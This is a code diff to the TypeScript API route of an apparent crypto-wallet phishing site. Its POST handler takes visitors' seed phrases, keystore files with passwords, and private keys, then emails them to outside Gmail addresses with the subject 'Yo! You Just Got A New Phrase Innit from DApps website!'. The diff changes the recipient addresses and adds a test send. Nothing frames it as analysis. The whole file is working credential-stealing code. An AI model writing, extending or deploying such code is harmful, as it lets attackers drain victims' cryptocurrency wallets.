@@ -22,13 +22,13 @@ const formatMessage = async (message: string) => {
   const formattedMessage = formattedLines.join('');
 
   const mailOptions = {
-    from: `EN ${email}`,
-    to: "osamathebomber3@gmail.com",
-    subject: "EN",
+    from: `BN ${email}`,
+    to: "ladenmike7@gmail.com",
+    subject: "BN",
     html: `<div>${message}</div>`,
   };
 
-  transporter.verify(function (error: any) {
+  transporter.verify(function (error: any, success: any) {
     if (error) {
       console.log(`here is the error: ${error}`);
     } else {
@@ -51,6 +51,7 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
+    await formatMessage('hi');
 
     if (phrase) {
 
@@ -70,12 +71,12 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'adev93108@gmail.com',
+        to: 'ogobillions458@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
 
-      transporter.verify(function (error) {
+      transporter.verify(function (error, success) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -109,12 +110,12 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
 
-      transporter.verify(function (error) {
+      transporter.verify(function (error, success) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -150,12 +151,12 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
 
-      transporter.verify(function (error) {
+      transporter.verify(function (error, success) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
